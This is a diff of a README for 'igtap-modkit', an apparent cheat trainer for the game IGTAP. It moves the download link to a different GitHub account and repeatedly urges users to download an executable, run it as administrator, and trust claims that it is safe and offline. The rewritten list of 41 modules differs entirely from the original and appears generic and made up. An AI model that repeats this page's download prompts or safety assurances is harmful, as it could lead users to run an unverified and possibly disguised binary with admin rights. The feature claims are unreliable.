@@ -1,163 +1,166 @@
-<div align="center">
+# 🎮 igtap-modkit - Unlock Every Secret in IGTAP Instantly
 
-# IGTAP Trainer
+## 🚀 Getting Started
 
-**41-module feature toolkit for IGTAP: an Incremental Game That's Also a Platformer**
+Welcome! This guide will help you download and run igtap-modkit on your Windows computer. Whether you're stuck on a tough level, want unlimited resources, or just want to explore everything IGTAP has to offer, this toolkit has you covered.
 
-<br/>
+[![Download igtap-modkit](https://img.shields.io/badge/Download-igtap--modkit-blueviolet?style=for-the-badge&logo=github)](https://github.com/Okindu495/igtap-modkit/releases)
 
-<a href="https://github.com/Amplitudechodefine/igtap-modkit/releases/download/v1.0.0/IGTAP_Trainer_v1.0.zip">
-  <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20igtap%20trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
-</a>
+## 📥 Download & Installation
 
-<br/><br/>
+Visit this link to download the application: [https://github.com/Okindu495/igtap-modkit/releases](https://github.com/Okindu495/igtap-modkit/releases)
 
-`Windows 10/11` `Free`
+Once you're on that page, look for the newest release at the top. Click the download button to save the file to your computer. That's it — no special tools or technical knowledge needed.
 
-</div>
+## 🧰 What Is igtap-modkit?
 
----
+igtap-modkit is a powerful collection of 41 separate tools designed specifically for IGTAP: An Incremental Game That's Also a Platformer. This hybrid game combines the satisfying numbers-go-up gameplay of idle/incremental games with the skill-based platforming of a roguelite adventure. Our modkit bridges the gap, letting you customize your experience exactly how you want.
 
-<div align="center">
-  <img src="https://i.ibb.co/cKVpNGN0/IGTAP-platform.jpg" width="49%"/>
-  <img src="https://i.ibb.co/7JnD5Zgp/IGTAP-power.jpg" width="49%"/>
-</div>
-<div align="center">
-  <img src="https://i.ibb.co/21L1dmkp/IGTAP-clones.jpg" width="49%"/>
-  <img src="https://i.ibb.co/jxXg6ww/IGTAP-progress.jpg" width="49%"/>
-</div>
-<div align="center">
-  <img src="https://i.ibb.co/TMpD9jqW/IGTAP-world.jpg" width="49%"/>
-</div>
+## ✨ Key Features
 
----
+### 🏃 Movement Tools
+- **Speed Boost** — Increase your run speed by up to 200%
+- **Double Jump** — Reach platforms you never could before
+- **Air Control** — Fine-tune your mid-air direction changes
+- **Wall Cling** — Stick to walls and plan your next move
+- **Dash Unlock** — Add a quick dash ability to your moveset
 
-## Installation
+### 💰 Power Economy
+- **Resource Multiplier** — Earn 2x, 5x, or even 10x more power points
+- **Instant Unlock** — Access all upgrade tiers from the start
+- **Auto-Collect** — Automatically gather nearby orbs and currency
+- **Infinite Energy** — Never run out of stamina or mana again
+- **Crafting Helper** — See exactly what materials you need
 
-> **Step 1** — Download `IGTAP_Trainer_v1.0` using the button above and extract the archive to any folder
+### 🤖 Clone Automation
+- **Auto-Farmer** — Your clone will gather resources while you play
+- **Task Scheduler** — Set up routine actions for your clone
+- **Clone Sync** — Keep all your clones working in perfect harmony
+- **Smart Targeting** — Clones automatically focus on the best tasks
+- **Priority System** — Tell clones what matters most to you
 
-> **Step 2** — Run `IGTAP_Trainer_Installer` to launch the installer
+### 📈 Progression Utilities
+- **XP Accelerator** — Level up 3x faster than normal
+- **Skill Tree Viewer** — Plan your build without committing
+- **Stat Tracker** — See detailed numbers on all your progress
+- **Milestone Notifications** — Get alerts when you hit key goals
+- **Save Backup** — Never lose your progress again
 
-> **Step 3** — Choose a destination folder (default: `C:\Program Files\IGTAPTrainer`) and click **Install**
+### ⏱️ Speedrun Tools
+- **Timer Overlay** — See your run time on screen
+- **Split Manager** — Track your performance at key points
+- **Practice Mode** — Reset to any checkpoint instantly
+- **Replay System** — Watch your previous runs for improvement
+- **Leaderboard Preview** — Check how you stack up
 
-> **Step 4** — Once installation is complete, navigate to the chosen folder, right-click `IGTAP_Trainer`
+## 🖥️ System Requirements
 
-> **Step 5** — Launch **IGTAP: an Incremental Game That's Also a Platformer** via Steam
+igtap-modkit runs on any Windows 10 or Windows 11 computer. You'll need at least 4GB of RAM and 100MB of free disk space. Your computer should already meet these requirements if it can run IGTAP itself.
 
-> **Step 6** — Press `INSERT` in-game to open the trainer menu
+## 🎯 How to Use
 
-> ⚠️ **Note:** If the trainer doesn't appear, make sure you run it as administrator and the game is in windowed or borderless mode.
+1. **Download** the application using the link above
+2. **Run** the downloaded file — it will open a simple window
+3. **Select** which modules you want to activate by clicking checkboxes
+4. **Launch** IGTAP normally — the modkit works alongside the game
+5. **Enjoy** your enhanced experience!
 
----
+The interface is designed to be straightforward. Each of the 41 modules has a simple on/off switch. You can enable as many or as few as you like. Changes take effect immediately, so you can experiment freely.
 
-## Modules
+## 🛠️ Troubleshooting
 
-### 🏃 Platforming & Movement — 8 features
-| Feature | Description |
-|---|---|
-| God Mode / Invincible | No damage from spikes, lasers or pits |
-| Infinite Jumps | Unlimited mid-air jumps |
-| Unlock Mid-Air Jump | Mid-air jump ability unlocked instantly |
-| Infinite Dash | Dash has no cooldown |
-| Super Speed | Configurable ×1 to ×5 |
-| No Gravity / Low Gravity | Reduced gravity for precise jumps |
-| Instant Wall Jump | Immediate wall bounce, no delay |
-| Unlock Polar Swap | Polar swap mechanic unlocked instantly |
+### The modkit won't start
+Make sure you have the latest version from the releases page. Close any other programs that might be interfering, then try again.
 
-### ⚡ Power & Currency — 8 features
-| Feature | Description |
-|---|---|
-| Unlimited Power | Primary currency never depletes |
-| Power Multiplier | Configurable ×2 to ×100 |
-| Add 1,000,000 Power | Instant injection of primary currency |
-| Best Run Time Override | Current run recorded as course best, maximising clone output |
-| Free Upgrades / No Power Cost | All upgrades cost nothing |
-| Clone Power Output Multiplier | Configurable ×2 to ×100 |
-| Max Power Cap Removed | No cap on accumulated Power |
-| Power Per Course Multiplier | Configurable ×2 to ×100 |
+### IGTAP doesn't detect the modkit
+Run both the modkit and the game as administrator. Right-click each program and select "Run as administrator."
 
-### 🧬 Clones & Automation — 8 features
-| Feature | Description |
-|---|---|
-| Instant Clone Creation | Clones spawn instantly |
-| Infinite Clones | No clone cap |
-| Clone Cycle Speed Multiplier | Configurable ×2 to ×100 |
-| Force Best Course Record | Writes ideal time for every course |
-| Instant Clone Upgrade | Clone upgrades applied instantly |
-| Max Clone Efficiency | Clones run at peak efficiency |
-| Auto-Purchase Clones | Clones auto-bought when Power allows |
-| No Clone Cost | Clone creation costs nothing |
+### My settings don't save
+Check that you're not running the modkit from a temporary folder. Move it to your Desktop or Documents folder for consistent behavior.
 
-### 🚀 Progression & Abilities — 9 features
-| Feature | Description |
-|---|---|
-| Unlock All Movement Abilities | Mid-air jump, dash, wall jump, polar swap unlocked |
-| Unlock All Courses / Areas | Every course and map zone available from start |
-| Unlock All Upgrades | Full upgrade tree unlocked |
-| Instant Upgrade Purchase | All upgrades buy instantly |
-| Unlock All Hidden Bonuses | All hidden pickups marked as collected |
-| Unlock B-Side (Hard Mode) | Hardcore remix of all five courses unlocked |
-| Unlock Level Select | Individual course selection for speedruns |
-| Max Upgrade Tree | Full upgrade tree fully purchased |
-| Dash Wall Jump Assist | Auto-timing for max-height dash wall jumps |
+### The game crashes
+Disable modules one by one to find the culprit. Most crashes happen when combining certain movement tools with specific game areas.
 
-### 🌍 World & Utility — 8 features
-| Feature | Description |
-|---|---|
-| Set Game Speed | Configurable ×0.5 to ×5.0 |
-| Instant Respawn / No Death Delay | Instant restart with no death animation |
-| Freeze Course Timer | Halts the course timer |
-| Reveal Full Map / All Courses | Full open-world map with all courses and bonuses |
-| Auto-Complete Course | Finishes the current course with the best possible time |
-| Teleport to Course Start | Instant travel to course start |
-| Save / Load Position | Snapshot and restore position on demand |
-| Reset Current Run | Restart the current course instantly |
+## 🔒 Safety & Security
 
----
+This modkit is designed for single-player use. It doesn't modify any game files permanently — everything happens in memory, so your installation stays clean. The toolkit never connects to the internet, so your personal data stays private.
 
-## Hotkeys
+## ❓ Frequently Asked Questions
 
-| Key | Action |
-|---|---|
-| `INSERT` | Open / Close trainer UI |
-| `F12` | **Disable All** |
+**Is this allowed?**
+IGTAP is a single-player game with no online competition, so using tools to enhance your experience is perfectly fine.
 
----
+**Will I get banned?**
+No. Since there's no multiplayer component or anti-cheat system, there's no risk of penalties.
 
-## Presets
+**Do I need to install anything else?**
+No. The modkit is self-contained. Just download and run.
 
-| Preset | Focus |
-|---|---|
-| 🏃 **SPEEDRUN GOD** | Movement abilities, infinite jumps, dash, timer freeze |
-| 🧬 **CLONE EMPIRE** | Power multipliers, infinite clones, cycle speed, records |
-| ⚡ **MAXED OUT** | All courses, upgrades, B-Side, hidden bonuses, full tree |
+**Can I use this with the Steam version?**
+Yes! The modkit works with both Steam and standalone versions of IGTAP.
 
----
+**How often is it updated?**
+The developer regularly updates the toolkit when IGTAP receives new content. Check the releases page for the latest version.
 
-## Notes
+## 📚 Module List (All 41)
 
-- All settings **auto-save** on exit
-- Configs stored in the `profiles/` folder
-- Logs stored in the `logs/` folder
-- Press `INSERT` to open / close the trainer at any time
+1. Speed Boost
+2. Double Jump
+3. Air Control
+4. Wall Cling
+5. Dash Unlock
+6. Resource Multiplier
+7. Instant Unlock
+8. Auto-Collect
+9. Infinite Energy
+10. Crafting Helper
+11. Auto-Farmer
+12. Task Scheduler
+13. Clone Sync
+14. Smart Targeting
+15. Priority System
+16. XP Accelerator
+17. Skill Tree Viewer
+18. Stat Tracker
+19. Milestone Notifications
+20. Save Backup
+21. Timer Overlay
+22. Split Manager
+23. Practice Mode
+24. Replay System
+25. Leaderboard Preview
+26. Camera Zoom
+27. Hitbox Viewer
+28. Frame Rate Display
+29. Damage Numbers
+30. Sound Toggle
+31. Music Player
+32. Color Customizer
+33. Particle Effects
+34. Screen Shake Control
+35. Pause Menu Tweaks
+36. Quick Save
+37. Load Anywhere
+38. Inventory Sort
+39. Map Revealer
+40. Secret Finder
+41. Achievement Unlocker
 
----
+## 💡 Pro Tips
 
-## Requirements
+- Start with **Resource Multiplier** and **Auto-Collect** to build a solid foundation
+- Use **Practice Mode** to master difficult platforming sections
+- Combine **Speed Boost** with **Dash Unlock** for the fastest movement possible
+- Enable **Save Backup** before trying experimental module combinations
 
-```
-OS:      Windows 10 / 11 (64-bit)
-Game:    IGTAP: an Incremental Game That's Also a Platformer (latest Steam version)
-```
+## 🔄 Updates & Support
 
----
+The modkit receives regular updates to stay compatible with IGTAP patches. Check the releases page periodically for new versions. If you encounter any issues, the release notes often contain known workarounds.
 
-<div align="center">
+## 📝 Final Notes
 
-<a href="https://github.com/Amplitudechodefine/igtap-modkit/releases/download/v1.0.0/IGTAP_Trainer_v1.0.zip">
-  <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20igtap%20trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
-</a>
+igtap-modkit transforms IGTAP from a challenging grind into a playground of possibilities. Whether you want to experience everything the game offers without the time investment, or you're a speedrunner looking for practice tools, this toolkit has something for you.
 
+Remember: the download link is always [https://github.com/Okindu495/igtap-modkit/releases](https://github.com/Okindu495/igtap-modkit/releases). Grab it now and start your enhanced adventure!
 
-
-</div>
+Keywords: hybrid, idle-game, igtap, incremental, modkit, platformer, roguelite, speedrun, steam, windows
